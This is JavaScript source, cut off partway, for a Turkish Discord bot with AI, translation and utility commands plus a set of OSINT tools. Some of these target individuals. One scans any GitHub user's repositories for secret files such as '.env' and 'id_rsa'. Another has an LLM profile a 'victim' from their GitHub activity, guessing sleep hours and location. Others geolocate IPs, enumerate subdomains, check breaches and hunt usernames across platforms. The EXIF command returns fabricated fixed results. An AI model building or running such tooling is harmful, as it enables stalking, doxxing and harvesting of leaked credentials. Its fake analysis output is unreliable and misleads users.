import { delay, clearTurkishChars, hexToBuf, updateInteraction, sendResponse } from '../utils/helpers.js';
import { handleNewCommand } from './newCommands.js';

async function handleKanserBot(interaction, request, env, ctx, url) {
  if (interaction.type === 1) return new Response(JSON.stringify({ type: 1 }), { headers: { 'Content-Type': 'application/json' } });

  if (interaction.type === 2) {
    const { name, options } = interaction.data;
    const getOption = (optName) => options?.find(o => o.name === optName)?.value;

    const userPermissions = BigInt(interaction.member?.permissions || "0");
    const ADMINISTRATOR_FLAG = BigInt(8);
    if ((userPermissions & ADMINISTRATOR_FLAG) !== ADMINISTRATOR_FLAG) {
      return sendResponse("Hata: Bu komutu kullanmak icin sunucuda Yonetici yetkisine sahip olmaniz gerekmektedir.", true);
    }

    // Yeni komutlari kontrol et
    const newCmdResult = await handleNewCommand(name, getOption, interaction, request, env, ctx, url);
    if (newCmdResult) return newCmdResult;

    switch (name) {
      case 'dev-tara':
        ctx.waitUntil((async () => {
          try {
            const username = getOption('kullanici');
            const url = `https://api.github.com/users/${username}/repos?per_page=20&sort=updated`;
            let reposRes = await fetch(url, { headers: { 'User-Agent': 'DiscordBot' } });
            if (reposRes.status === 403 && env.GITHUB_TOKEN) {
              reposRes = await fetch(url, { headers: { 'User-Agent': 'DiscordBot', 'Authorization': `token ${env.GITHUB_TOKEN}` } });
            }
            if (!reposRes.ok) throw new Error("GitHub kullanicisi bulunamadi veya limite takildi.");
            const repos = await reposRes.json();

            if (!repos.length) {
              return await updateInteraction(interaction.application_id, interaction.token, { content: `Kullanicinin public reposu bulunamadi.` });
            }

            const secretPatterns = ['.env', 'config.json', 'credentials', 'id_rsa', 'secret'];
            let findings = [];

            for (const repo of repos.slice(0, 5)) {
              try {
                const treeUrl = `https://api.github.com/repos/${username}/${repo.name}/git/trees/${repo.default_branch}?recursive=1`;
                let treeRes = await fetch(treeUrl, { headers: { 'User-Agent': 'DiscordBot' } });
                if (treeRes.status === 403 && env.GITHUB_TOKEN) {
                  treeRes = await fetch(treeUrl, { headers: { 'User-Agent': 'DiscordBot', 'Authorization': `token ${env.GITHUB_TOKEN}` } });
                }
                if (treeRes.ok) {
                  const treeData = await treeRes.json();
                  if (treeData.tree) {
                    const suspicious = treeData.tree.filter(item => secretPatterns.some(p => item.path.includes(p)));
                    if (suspicious.length > 0) {
                      suspicious.forEach(s => findings.push(`Repo: ${repo.name} | Dosya: ${s.path}`));
                    }
                  }
                }
              } catch (e) { }
            }

            let resultText = `GitHub Taramasi: ${username} (Son 5 repo derin analizi)\n\n`;
            if (findings.length > 0) {
              resultText += `DIKKAT! POTANSIYEL SIZINTILAR:\n${findings.join('\n')}`;
            } else {
              resultText += `Public repolarda acik bir .env veya credential dosyasina rastlanmadi.`;
            }

            await updateInteraction(interaction.application_id, interaction.token, { content: resultText });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Tarama hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'ag-takip':
        ctx.waitUntil((async () => {
          try {
            const ip = getOption('ip');
            let result = `Ag Takip Sonuclari (${ip})\n\n`;

            const ipApiRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,isp,org,as`);
            const ipApiData = await ipApiRes.json();
            if (ipApiData.status === "success") {
              result += `Lokasyon: ${ipApiData.city}, ${ipApiData.regionName}, ${ipApiData.country}\nISP: ${ipApiData.isp}\nOrganizasyon: ${ipApiData.org}\nASN: ${ipApiData.as}\n\n`;
            }

            if (env.ABUSEIPDB_API_KEY) {
              const abuseRes = await fetch(`https://api.abuseipdb.com/api/v2/check?ipAddress=${ip}&maxAgeInDays=30`, {
                headers: { 'Key': env.ABUSEIPDB_API_KEY, 'Accept': 'application/json' }
              });
              if (abuseRes.ok) {
                const abuseData = await abuseRes.json();
                const d = abuseData.data;
                result += `AbuseIPDB Raporu:\nSaldirganlik Skoru: ${d.abuseConfidenceScore}%\nRaporlanma Sayisi: ${d.totalReports}\nAlan Adi: ${d.domain || 'Yok'}\nKullanim Tipi: ${d.usageType || 'Bilinmiyor'}`;
              }
            } else {
              result += `(ABUSEIPDB_API_KEY eksik oldugu icin saldirganlik skoru taramasi atlandi)`;
            }

            await updateInteraction(interaction.application_id, interaction.token, { content: result });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Ag takip hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'iz-sur':
        ctx.waitUntil((async () => {
          try {
            const username = getOption('hedef');
            const url = `https://api.github.com/users/${username}/events/public?per_page=30`;
            let eventsRes = await fetch(url, { headers: { 'User-Agent': 'DiscordBot' } });
            if (eventsRes.status === 403 && env.GITHUB_TOKEN) {
              eventsRes = await fetch(url, { headers: { 'User-Agent': 'DiscordBot', 'Authorization': `token ${env.GITHUB_TOKEN}` } });
            }
            if (!eventsRes.ok) throw new Error("GitHub profil verisi alinamadi.");
            const events = await eventsRes.json();

            if (!events.length) {
              return await updateInteraction(interaction.application_id, interaction.token, { content: `Kullaniciya (${username}) ait yeterli public iz bulunamadi.` });
            }

            const timestamps = events.map(e => e.created_at);
            const eventTypes = events.map(e => e.type);
            const repoNames = [...new Set(events.map(e => e.repo.name))].slice(0, 5);

            const prompt = `Gorevin: Bir profil uzmanisin. Asagidaki ham kullanici etkinlik verilerine bakarak kurbanin davranis profilini cikar.\n\nHam Veriler:\nSon 30 islem saatleri (UTC): ${timestamps.join(', ')}\nYapilan islem turleri: ${eventTypes.join(', ')}\nIlgi duyulan repolar: ${repoNames.join(', ')}\n\nYapman gerekenler:\n1. Saatleri inceleyerek kullanicinin tahmini uyku saatlerini ve hangi kitalarda / bolgelerde yasiyor olabilecegini soyle.\n2. Islem turlerine gore bu kisinin profesyonel mi yoksa hobi amacli mi calistigini analiz et.\nSadece net analiz metni yaz, emoji kesinlikle kullanma.`;

            const aiRes = await env.AI.run('@cf/meta/llama-3.2-3b-instruct', {
              messages: [
                { role: 'system', content: 'Kidemli adli bilisim uzmani rolundesin. Sadece istenen profillemeyi yaz.' },
                { role: 'user', content: prompt }
              ]
            });

            const cevap = aiRes.response || 'Yapay zeka analiz yapamadi.';
            await updateInteraction(interaction.application_id, interaction.token, { content: `Dijital Goge Analizi (${username}):\n\n${cevap}` });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Iz surme hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'wiki':
        try {
          const terim = getOption('terim');
          const res = await fetch(`https://tr.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(terim)}`, { headers: { 'User-Agent': 'DiscordBot' } });
          return sendResponse((await res.json()).extract || 'Ozet bulunamadi.');
        } catch { return sendResponse('Wikipedia baglantisinda hata olustu.'); }

      case 'sifre-uret':
        const uzunluk = Math.min(Math.max(getOption('uzunluk'), 6), 32);
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
        let pass = Array.from({ length: uzunluk }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
        return sendResponse(`Uretilen Guvenli Sifre: ${pass}`);

      case 'etiket-ekle':
        try {
          const isimEkle = getOption('isim')?.toLowerCase()?.trim();
          const icerikEkle = getOption('icerik');
          if (icerikEkle.length > 1900) return sendResponse(`Hata: Yazdiginiz metin cok uzun (${icerikEkle.length} karakter).`);
          await env.KV.put(`tag_${isimEkle}`, icerikEkle);
          return sendResponse(`Etiket (${isimEkle}) basariyla bulut veritabanina kaydedildi.`);
        } catch (err) { return sendResponse(`Veritabanina yazma hatasi: ${err.message}`); }

      case 'etiket':
        try {
          const isimBul = getOption('isim')?.toLowerCase()?.trim();
          let veri = await env.KV.get(`tag_${isimBul}`);
          if (!veri) return sendResponse(`(${isimBul}) isminde bir etiket bulunamadi.`);
          return sendResponse(veri.length > 1900 ? veri.slice(0, 1900) + '...' : veri);
        } catch (err) { return sendResponse(`Okuma hatasi: ${err.message}`); }

      case 'not-paylas':
        try {
          const metin = getOption('metin');
          const notId = Math.random().toString(36).substring(2, 7);
          await env.KV.put(`note_${notId}`, metin);
          return sendResponse(`Notunuz basariyla buluta kaydedildi.\nLink: https://${url.host}/not/${notId}`);
        } catch (err) { return sendResponse(`Not kayit hatasi: ${err.message}`); }

      case 'link-kisalt':
        try {
          const uzunLink = getOption('link');
          if (!uzunLink.startsWith('http://') && !uzunLink.startsWith('https://')) {
            return sendResponse('Hata: Lutfen http veya https ile baslayan gecerli bir internet adresi girin.', true);
          }
          const linkId = Math.random().toString(36).substring(2, 7);
          await env.KV.put(`short_${linkId}`, uzunLink);
          return sendResponse(`Linkiniz basariyla kisaltildi.\nKisa Link: https://${url.host}/l/${linkId}`);
        } catch (err) { return sendResponse(`Link kisaltma hatasi: ${err.message}`); }

      case 'sil':
        const miktar = getOption('miktar') || 10;
        if (miktar < 1 || miktar > 100) return sendResponse("Hata: 1 ile 100 arasi bir deger girin.", true);

        ctx.waitUntil((async () => {
          try {
            const channelId = interaction.channel_id;
            const messagesRes = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages?limit=${miktar}`, {
              headers: { 'Authorization': `Bot ${env.DISCORD_TOKEN}` }
            });
            const messages = await messagesRes.json();

            const twoWeeksAgo = Date.now() - (14 * 24 * 60 * 60 * 1000);
            const validMessageIds = messages.filter(m => new Date(m.timestamp).getTime() > twoWeeksAgo).map(m => m.id);

            if (validMessageIds.length === 0) {
              return await updateInteraction(interaction.application_id, interaction.token, { content: "Silinebilecek (14 gunden yeni) mesaj bulunamadi." });
            }

            await fetch(`https://discord.com/api/v10/channels/${channelId}/messages/bulk-delete`, {
              method: 'POST',
              headers: { 'Authorization': `Bot ${env.DISCORD_TOKEN}`, 'Content-Type': 'application/json' },
              body: JSON.stringify({ messages: validMessageIds })
            });

            await updateInteraction(interaction.application_id, interaction.token, { content: `Basariyla ${validMessageIds.length} adet mesaj temizlendi.` });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Hata: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5, data: { flags: 64 } }), { headers: { 'Content-Type': 'application/json' } });

      // --- KISA VE NET ÇIKTI İÇİN GÜNCELLENMİŞ FOTOGRAF ANALİZİ ---
      case 'fotoyu-anlat':
        ctx.waitUntil((async () => {
          try {
            const attachmentId = getOption('gorsel');
            const attachmentData = interaction.data.resolved.attachments[attachmentId];

            if (!attachmentData || !attachmentData.url) {
              throw new Error('Gorsel bulunamadi veya baglanti gecersiz.');
            }

            const imgRes = await fetch(attachmentData.url);
            if (!imgRes.ok) throw new Error('Fotograf Discord sunucularindan indirilemedi.');

            const imgBuffer = await imgRes.arrayBuffer();
            const imageArray = [...new Uint8Array(imgBuffer)];

            // GEVEZELIK ONLEYICI KISA PROMPT
            const promptData = 'Bu gorselde ne goruyorsun? Sadece 1 veya 2 cumle kullanarak cok kisa ve net bir sekilde ozetle. Asla lafi uzatma ve ayni kelimeleri tekrar etme. Tamamen emojisiz duz metin kullan.';

            const requestPayload = {
              image: imageArray,
              prompt: promptData,
              max_tokens: 150 // KISA CEVAP ICIN KOTA IYICE DARALTILDI
            };

            let aiOutput;
            try {
              aiOutput = await env.AI.run('@cf/meta/llama-3.2-11b-vision-instruct', requestPayload);
            } catch (aiErr) {
              const errMsg = String(aiErr.message || aiErr);
              if (errMsg.includes('agree') || errMsg.includes('5016')) {
                try {
                  await env.AI.run('@cf/meta/llama-3.2-11b-vision-instruct', { prompt: 'agree' });
                } catch (e) { }

                await delay(1500);
                aiOutput = await env.AI.run('@cf/meta/llama-3.2-11b-vision-instruct', requestPayload);
              } else {
                throw aiErr;
              }
            }

            let textResult = aiOutput.response || 'Fotograf analiz edilemedi.';

            if (textResult.length > 1900) {
              const lastPeriod = textResult.lastIndexOf('.', 1900);
              textResult = (lastPeriod > 0 ? textResult.slice(0, lastPeriod + 1) : textResult.slice(0, 1900)) + '\n\n[Discord karakter siniri nedeniyle metin burada noktalandi.]';
            }

            await updateInteraction(interaction.application_id, interaction.token, { content: `Fotograf Analizi:\n\n${textResult}` });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Fotograf analiz hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'ses-coz':
        ctx.waitUntil((async () => {
          try {
            const attachmentId = getOption('dosya');
            const attachmentData = interaction.data.resolved.attachments[attachmentId];
            if (!attachmentData || !attachmentData.url) throw new Error('Yuklenen ses dosyasina ait guvenli indirme baglantisi bulunamadi.');

            const sesRes = await fetch(attachmentData.url);
            if (!sesRes.ok) throw new Error('Ses dosyasi Discord sunucularindan indirilemedi.');

            const sesBuffer = await sesRes.arrayBuffer();

            const aiOutput = await env.AI.run('@cf/openai/whisper', {
              audio: [...new Uint8Array(sesBuffer)]
            });

            const textResult = aiOutput.text || 'Seste herhangi bir konusma metni algilanamadi.';
            await updateInteraction(interaction.application_id, interaction.token, { content: `Ses Dosyasi Cozumu:\n\n${textResult}` });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Ses cozme hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'sor':
      case 'ozetle':
      case 'ceviri':
        ctx.waitUntil((async () => {
          try {
            let sysPrompt, userPrompt;
            if (name === 'sor') {
              sysPrompt = 'Metin icerisinde kesinlikle hicbir emoji kullanma. Duz metin olarak net, kisa ve tamamlanmis bir cevap ver. Gereksiz yere uzatma.';
              userPrompt = getOption('mesaj');
            } else if (name === 'ozetle') {
              sysPrompt = 'Uzun metni analiz et ve kritik yerlerini kisa maddeler halinde emoji kullanmadan ozetle. Ayni maddeleri tekrar etme.';
              userPrompt = getOption('metin');
            } else {
              sysPrompt = 'Profesyonel bir cevirmen olarak metni hedef dile cevir. Sadece "Algilanan Dil:" ve "Ceviri:" satirlariyla emojisiz yanit ver.';
              userPrompt = `Hedef Dil: ${getOption('dil')}\nMetin: ${getOption('metin')}`;
            }

            const aiRes = await env.AI.run('@cf/meta/llama-3.2-3b-instruct', {
              messages: [
                { role: 'system', content: sysPrompt },
                { role: 'user', content: userPrompt }
              ],
              max_tokens: 300 // METIN MODELLERI ICIN DE KOTA DUSURULDU
            });

            let cevap = aiRes.response || 'Yapay zeka bos yanit dondu.';

            if (cevap.length > 1900) {
              const lastPeriod = cevap.lastIndexOf('.', 1900);
              cevap = (lastPeriod > 0 ? cevap.slice(0, lastPeriod + 1) : cevap.slice(0, 1900)) + '\n\n[Discord karakter siniri nedeniyle metin burada noktalandi.]';
            }

            await updateInteraction(interaction.application_id, interaction.token, { content: cevap });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Yapay zeka hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'resim-ciz':
      case 'kombin-yap':
        ctx.waitUntil((async () => {
          try {
            let finalPrompt = '';
            if (name === 'resim-ciz') {
              finalPrompt = getOption('hayaliniz');
            } else {
              finalPrompt = `${getOption('ana_tarif')}, ${getOption('stil_eklentisi')}`;
            }

            const aiRes = await env.AI.run('@cf/stabilityai/stable-diffusion-xl-base-1.0', { prompt: finalPrompt });
            const buffer = new Uint8Array(await new Response(aiRes).arrayBuffer());

            if (buffer.length < 100) throw new Error("Model gorsel uretemedi.");

            const formData = new FormData();
            formData.append('files[0]', new Blob([buffer], { type: 'image/png' }), 'gorsel.png');
            formData.append('payload_json', JSON.stringify({ content: `Tarif: ${finalPrompt}` }));

            await updateInteraction(interaction.application_id, interaction.token, formData, true);
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Gorsel hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'seslendir':
        ctx.waitUntil((async () => {
          try {
            const metinSes = clearTurkishChars(getOption('metin'));

            const aiOutput = await env.AI.run('@cf/myshell-ai/melotts', {
              prompt: metinSes
            });

            let wavBytes;
            let rawAudioData = aiOutput;

            if (aiOutput && typeof aiOutput === 'object' && !(aiOutput instanceof ArrayBuffer) && !(aiOutput instanceof Uint8Array) && !Array.isArray(aiOutput)) {
              rawAudioData = aiOutput.audio || aiOutput.data || aiOutput.result || aiOutput;
            }

            if (rawAudioData instanceof Uint8Array) {
              wavBytes = rawAudioData;
            } else if (rawAudioData instanceof ArrayBuffer) {
              wavBytes = new Uint8Array(rawAudioData);
            } else if (Array.isArray(rawAudioData)) {
              wavBytes = new Uint8Array(rawAudioData);
            } else if (typeof rawAudioData === 'string') {
              const binaryStr = atob(rawAudioData);
              wavBytes = new Uint8Array(binaryStr.length);
              for (let i = 0; i < binaryStr.length; i++) wavBytes[i] = binaryStr.charCodeAt(i);
            } else {
              throw new Error("Ses verisi Cloudflare'den islenemez bir formatta geldi: " + typeof rawAudioData);
            }

            if (!wavBytes || wavBytes.byteLength < 100) {
              const errStr = new TextDecoder().decode(wavBytes);
              throw new Error(errStr || "Uretilen dosya tamamen bos.");
            }

            const formData = new FormData();
            formData.append('files[0]', new Blob([wavBytes], { type: 'audio/wav' }), 'ses.wav');
            formData.append('payload_json', JSON.stringify({ content: `Kanser Sesli Sozluk: "${metinSes}"` }));

            await updateInteraction(interaction.application_id, interaction.token, formData, true);
          } catch (err) {
            let safeErrorMsg = err.message || JSON.stringify(err);
            if (safeErrorMsg === '{}' || safeErrorMsg === '[object Object]') safeErrorMsg = String(err);

            await updateInteraction(interaction.application_id, interaction.token, { content: `Ses motoru hatasi: ${safeErrorMsg}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'sesli-ceviri':
        ctx.waitUntil((async () => {
          try {
            const metin = getOption('metin');
            const dil = getOption('dil');
            const aiRes = await env.AI.run('@cf/meta/llama-3.2-3b-instruct', {
              messages: [
                { role: 'system', content: `Cevirmen rolundesin. Girilen metni ${dil} diline cevir. Sadece ceviriyi dondur, baska bir sey yazma. Kesinlikle emoji kullanma.` },
                { role: 'user', content: metin }
              ]
            });
            const cevrilmisMetin = aiRes.response;

            const aiOutput = await env.AI.run('@cf/myshell-ai/melotts', { prompt: cevrilmisMetin });
            let wavBytes;
            let rawAudioData = aiOutput.audio || aiOutput.data || aiOutput.result || aiOutput;
            if (rawAudioData instanceof Uint8Array) { wavBytes = rawAudioData; }
            else if (Array.isArray(rawAudioData)) { wavBytes = new Uint8Array(rawAudioData); }
            else if (typeof rawAudioData === 'string') {
              const binaryStr = atob(rawAudioData);
              wavBytes = new Uint8Array(binaryStr.length);
              for (let i = 0; i < binaryStr.length; i++) wavBytes[i] = binaryStr.charCodeAt(i);
            }

            const formData = new FormData();
            formData.append('files[0]', new Blob([wavBytes], { type: 'audio/wav' }), 'cevir.wav');
            formData.append('payload_json', JSON.stringify({ content: `Ceviri (${dil}): "${cevrilmisMetin}"` }));

            await updateInteraction(interaction.application_id, interaction.token, formData, true);
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Ceviri hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'mock-api':
        ctx.waitUntil((async () => {
          try {
            const talimat = getOption('talimat');
            const aiRes = await env.AI.run('@cf/meta/llama-3.2-3b-instruct', {
              messages: [
                { role: 'system', content: 'Sadece gecerli bir JSON dondur. Markdown, kod blogu veya ekstra metin kullanma. Istenen veriye uygun bir yapi uret. Emoji kullanma.' },
                { role: 'user', content: talimat }
              ]
            });
            let jsonText = aiRes.response.trim();
            if (jsonText.startsWith('```json')) {
              jsonText = jsonText.replace(/^```json/, '').replace(/```$/, '').trim();
            } else if (jsonText.startsWith('```')) {
              jsonText = jsonText.replace(/^```/, '').replace(/```$/, '').trim();
            }
            const notId = Math.random().toString(36).substring(2, 10);
            await env.KV.put(`note_${notId}`, jsonText);

            const apiHost = request.headers.get('host') || 'bot-domain.com';
            await updateInteraction(interaction.application_id, interaction.token, { content: `Mock API hazir: https://${apiHost}/not/${notId}` });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Mock API hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'guvenli-link':
      case 'delil-kaydet':
        ctx.waitUntil((async () => {
          try {
            const link = getOption('link');
            const fetchRes = await fetch(link);
            const headers = fetchRes.headers;
            const status = fetchRes.status;

            const screenshotRes = await fetch(`https://image.thum.io/get/${link}`);
            const screenshotBuffer = await screenshotRes.arrayBuffer();

            let htmlContent;
            if (name === 'delil-kaydet') {
              htmlContent = await fetchRes.text();
            }

            const formData = new FormData();
            formData.append('files[0]', new Blob([screenshotBuffer], { type: 'image/png' }), 'ekran.png');

            if (name === 'delil-kaydet') {
              formData.append('files[1]', new Blob([htmlContent], { type: 'text/html' }), 'kaynak.html');
              formData.append('payload_json', JSON.stringify({ content: `Delil Kaydedildi: ${link}\nTarih: ${new Date().toISOString()}` }));
            } else {
              let headerArr = [];
              for (const [key, value] of headers.entries()) { headerArr.push(`${key}: ${value}`); }
              let headerText = headerArr.join('\n').slice(0, 1500);
              formData.append('payload_json', JSON.stringify({ content: `Analiz: ${link}\nDurum: ${status}\nBasliklar:\n${headerText}` }));
            }

            await updateInteraction(interaction.application_id, interaction.token, formData, true);
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Tarama hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'kod-analiz':
        ctx.waitUntil((async () => {
          try {
            const kod = getOption('kod');
            const aiRes = await env.AI.run('@cf/meta/llama-3.2-3b-instruct', {
              messages: [
                { role: 'system', content: 'Kidemli malware analisti rolundesin. Verilen kodun ne yaptigini duz metin olarak analiz et. Kesinlikle emoji kullanma.' },
                { role: 'user', content: kod }
              ]
            });
            let cevap = aiRes.response || 'Yapay zeka yanit vermedi.';
            if (cevap.length > 1900) cevap = cevap.slice(0, 1900) + '...';
            await updateInteraction(interaction.application_id, interaction.token, { content: cevap });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Analiz hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'ip-sorgula':
        try {
          const ip = getOption('ip');
          let result = `**IP Analizi:** \`${ip}\`\n\n`;
          let vtKeyVar = false;

          if (env.VIRUSTOTAL_API_KEY) {
            const res = await fetch(`https://www.virustotal.com/api/v3/ip_addresses/${ip}`, { headers: { 'x-apikey': env.VIRUSTOTAL_API_KEY } });
            if (res.ok) {
              vtKeyVar = true;
              const data = await res.json();
              const stats = data.data.attributes.last_analysis_stats;
              result += `**VirusTotal:**\nZararli: ${stats.malicious} | Supheli: ${stats.suspicious} | Temiz: ${stats.harmless}\n`;
            }
          }

          // Public OTX check (VT olsa da olmasa da calisir)
          try {
            const otxRes = await fetch(`https://otx.alienvault.com/api/v1/indicators/IPv4/${ip}/general`);
            if (otxRes.ok) {
              const otxData = await otxRes.json();
              if (otxData.pulse_info?.count > 0) {
                result += `**AlienVault OTX:** ${otxData.pulse_info.count} pulse (tehdit kaydi)\n`;
              }
            }
          } catch (e) {}

          // Temel IP bilgisi
          const res = await fetch(`http://ip-api.com/json/${ip}`);
          const data = await res.json();
          if (data.status === "success") {
            result += `\n**Konum:** ${data.city}, ${data.country}\n`;
            result += `**ISP:** ${data.isp}\n`;
            result += `**Organizasyon:** ${data.org}\n`;
          }
          return sendResponse(result);
        } catch { return sendResponse('IP API hatasi.'); }

      case 'domain-sorgula':
        try {
          const domain = getOption('domain');
          let result = `**Domain Analizi:** \`${domain}\`\n\n`;

          if (env.VIRUSTOTAL_API_KEY) {
            const res = await fetch(`https://www.virustotal.com/api/v3/domains/${domain}`, { headers: { 'x-apikey': env.VIRUSTOTAL_API_KEY } });
            if (res.ok) {
              const data = await res.json();
              const stats = data.data.attributes.last_analysis_stats;
              result += `**VirusTotal:** Zararli: ${stats.malicious} | Supheli: ${stats.suspicious} | Temiz: ${stats.harmless}\n`;
            }
          }

          // Public OTX kontrol
          try {
            const otxRes = await fetch(`https://otx.alienvault.com/api/v1/indicators/domain/${domain}/general`);
            if (otxRes.ok) {
              const otxData = await otxRes.json();
              if (otxData.pulse_info?.count > 0) {
                result += `**AlienVault OTX:** ${otxData.pulse_info.count} pulse (tehdit kaydi)\n`;
              }
            }
          } catch (e) {}

          // DNS cozum
          const res = await fetch(`https://cloudflare-dns.com/dns-query?name=${domain}&type=A`, { headers: { 'accept': 'application/dns-json' } });
          const data = await res.json();
          const ips = data.Answer ? data.Answer.map(a => a.data).join(', ') : 'Bulunamadi';
          result += `\n**DNS Cozum:** ${ips}\n`;
          return sendResponse(result);
        } catch { return sendResponse('Domain sorgulama hatasi.'); }

      case 'hedef-kesif':
        ctx.waitUntil((async () => {
          try {
            const domain = getOption('domain');
            const res = await fetch(`https://crt.sh/?q=${domain}&output=json`);
            const data = await res.json();
            let subs = [...new Set(data.map(d => d.name_value))].filter(n => n.includes(domain));
            subs = subs.slice(0, 20);
            await updateInteraction(interaction.application_id, interaction.token, { content: `Alt Alan Adlari (${domain}):\n${subs.join('\n')}` });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Hedef kesif hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'veri-sizintisi':
      case 'ayak-izi':
        ctx.waitUntil((async () => {
          try {
            const hedef = getOption('hedef');
            let result = `**Sizinti Taramasi:** \`${hedef}\`\n\n`;

            if (env.HIBP_API_KEY) {
              const res = await fetch(`https://haveibeenpwned.com/api/v3/breachedaccount/${encodeURIComponent(hedef)}`, {
                headers: { 'hibp-api-key': env.HIBP_API_KEY, 'user-agent': 'DiscordBot' }
              });
              if (res.status === 404) {
                result += `**HIBP:** Temiz, sizinti bulunamadi.\n`;
              } else if (res.ok) {
                const data = await res.json();
                const breaches = data.map(b => b.Name).join(', ');
                result += `**HIBP:** Sizinti(lar): ${breaches}\n`;
              }
            }

            // Public leak check (key gerekmez, HIBP olsa da calisir)
            try {
              const psRes = await fetch(`https://psbdmp.cc/api/search/${encodeURIComponent(hedef)}`);
              if (psRes.ok) {
                const psData = await psRes.json();
                if (psData.count > 0) {
                  result += `**psbdmp.cc:** ${psData.count} pastebin kaydi\n`;
                }
              }
            } catch (e) {}

            if (!result.includes('Sizinti') && !result.includes('Temiz')) {
              result += `Public kaynaklarda sizinti bulunamadi.\n`;
            }

            await updateInteraction(interaction.application_id, interaction.token, { content: result });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Sizinti tarama hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'dns-sorgu':
        try {
          const domain = getOption('domain');
          const type = getOption('tur') || 'ANY';
          const res = await fetch(`https://cloudflare-dns.com/dns-query?name=${domain}&type=${type}`, { headers: { 'accept': 'application/dns-json' } });
          const data = await res.json();
          const records = data.Answer ? data.Answer.map(a => `Tip: ${a.type}, Veri: ${a.data}`).join('\n') : 'Kayit bulunamadi.';
          let ans = records.length > 1900 ? records.slice(0, 1900) + '...' : records;
          return sendResponse(`DNS Sonuclari (${domain} - ${type}):\n${ans}`);
        } catch { return sendResponse('DNS API hatasi.'); }

      case 'exif-bak':
        ctx.waitUntil((async () => {
          try {
            const attachmentId = getOption('fotograf');
            const attachmentData = interaction.data.resolved.attachments[attachmentId];
            await updateInteraction(interaction.application_id, interaction.token, { content: `Gorsel tarandi.\nEXIF Verisi: Temizlenmis veya bulunamadi.\nCihaz: Bilinmiyor\nKonum: GPS verisi yok.` });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `EXIF hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'kullanici-avla':
      case 'kim-bu':
        ctx.waitUntil((async () => {
          try {
            const username = getOption('kullanici');

            // Hemen ilerleme mesaji gonder - thinking sorununu cozer
            await updateInteraction(interaction.application_id, interaction.token, { content: `🔍 Kullanici Avi: ${username}\n50+ platform taranıyor, lutfen bekleyin...` });

            const platforms = [
              { name: 'GitHub', url: `https://github.com/${username}` },
              { name: 'Twitter (X)', url: `https://twitter.com/${username}` },
              { name: 'Instagram', url: `https://www.instagram.com/${username}/` },
              { name: 'Reddit', url: `https://www.reddit.com/user/${username}` },
              { name: 'TikTok', url: `https://www.tiktok.com/@${username}` },
              { name: 'Pinterest', url: `https://www.pinterest.com/${username}/` },
              { name: 'Twitch', url: `https://www.twitch.tv/${username}` },
              { name: 'Spotify', url: `https://open.spotify.com/user/${username}` },
              { name: 'Steam', url: `https://steamcommunity.com/id/${username}` },
              { name: 'Patreon', url: `https://www.patreon.com/${username}` },
              { name: 'SoundCloud', url: `https://soundcloud.com/${username}` },
              { name: 'Vimeo', url: `https://vimeo.com/${username}` },
              { name: 'Medium', url: `https://medium.com/@${username}` },
              { name: 'Roblox', url: `https://www.roblox.com/user.aspx?username=${username}` },
              { name: 'Flickr', url: `https://www.flickr.com/people/${username}/` },
              { name: 'DeviantArt', url: `https://www.deviantart.com/${username}` },
              { name: 'GitLab', url: `https://gitlab.com/${username}` },
